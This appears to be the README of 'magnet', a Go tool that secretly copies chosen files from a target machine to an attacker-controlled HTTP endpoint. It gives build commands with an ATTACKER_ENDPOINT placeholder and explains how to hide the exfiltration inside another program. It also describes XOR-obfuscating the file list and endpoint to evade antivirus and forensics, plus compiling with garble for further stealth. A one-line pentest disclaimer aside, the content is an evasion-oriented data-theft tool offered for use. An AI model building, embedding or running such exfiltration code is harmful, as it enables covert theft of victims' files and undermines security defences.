<div align=center>
  <h1>magnet</h1>
  <pre>🧲⚡
  Grab interesting files from target</strong><br>

  <b><i>Cross-platform</i></b>
  <b><i>Stealth</i></b>
  <b><i>Portable</i></b>  
  </pre>
</div>

The library is built to fetch predefined files of interest from a remote device. It assumes that an HTTP endpoint is listening when the program is launched.

<sup><i>For educational purpose only or during pentest assessment with prior permission</i></sup>

## Usage

All the work is made **At compilation time**, you need to specify:
* ***The remote endpoint***, where juicy files are uploaded
* ***The Juicy files***, list of files you want to grab
* ***The target os***, to fit the target (between: `windows`, `darwin`, `linux`)

```shell
export KEY=[YOUR_KEY]
export FILES=[FILENAME]
export ENDPOINT[ATTACKER_ENDPOINT]
export TARGET_OS=[TARGET_OS]
```

Then, the program execution on target will stealthy provide you the files you ask for.

You have 2 possibilities:
* [Hide exfiltration in your program](#inject-magnet-in-your-go-program)
* [Use the standalone `magnet` executable](#standalone)

### Inject `magnet` in your Go program

### Standalone


To build `magnet` binary in one step:
```shell
# build lobfuscator
make build.lobfuscator
# put lobfuscator in your PATH and then:
./build.sh $TARGET_OS $FILES $ENDPOINT $KEY
```


### Obfuscation/Encryption

To avoid detection systems, as we are seeking for sensitive files, **the different files we want to grab must not be in clear text within the binary** . Hence it used basic encryption with the key to decrypt embedded in binary. *(The aim is only to avoid AV and Detection system not to have strong encryption scheme)*

The same thing is made for the remote endpoints, to make the forensic analysis harder.

`lobfuscator` is the simple tool to perform the XOR encryption/decryption.

An exemple to build the obfuscated list:
```shell
cat [FILE] | lobfuscator $KEY > obfuscated.txt
# decrypt: cat obfuscated.txt | lobfuscator -d $KEY
```

## Notes

* For the remote endpoint , I suggest you to use the `/push` endpoint of a [`gitar`](https://github.com/ariary/gitar) listener
* The software is built to be stealthy hence:
  * error handling is not verbose (hidden flag to get more verbosity `-thisisdebug`)
  * I suggest to overwrite usage string in `magnet.go` to fit your attack scenario (for standalone use)
* To enhance the binary obfuscation use [`garble`](https://github.com/burrowers/garble) to compile `magnet` instead of `go`(adapt `build.sh` consequently)

## To do

* Handle directories
* Use other protocols to send files (ICMP, DNS, SMTP, etc...)
